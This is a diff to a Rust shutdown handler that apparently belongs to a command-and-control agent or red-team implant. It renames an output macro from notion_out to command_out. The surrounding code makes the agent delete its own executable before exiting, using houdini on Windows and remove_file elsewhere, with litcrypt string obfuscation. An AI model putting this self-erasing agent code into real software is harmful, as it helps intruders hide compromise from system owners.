@@ -5,7 +5,7 @@ use litcrypt::lc;
 #[cfg(windows)] use houdini;
 #[cfg(windows)] use rand::{thread_rng, Rng};
 #[cfg(windows)] use rand::distributions::Alphanumeric;
-use crate::cmd::notion_out;
+use crate::cmd::command_out;
 
 
 pub async fn handle() -> Result<String, Box<dyn Error>> {
@@ -29,14 +29,14 @@ pub async fn handle() -> Result<String, Box<dyn Error>> {
                 houdini::disappear_with_placeholder(rand_string);
                 // Shutdown agent
                 // In main.rs, shutdown::handle exits the current running process
-                notion_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!")
+                command_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!")
         }
 
         #[cfg(not(windows))] {
                 let running_agent: String = args().nth(0).unwrap();
                 match remove_file(running_agent) {
-                        Ok(_) => notion_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!"),
-                        Err(_) => notion_out!("[!] Couldn't delete, but killing the process anyway.")
+                        Ok(_) => command_out!("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!"),
+                        Err(_) => command_out!("[!] Couldn't delete, but killing the process anyway.")
                 }
         }
 
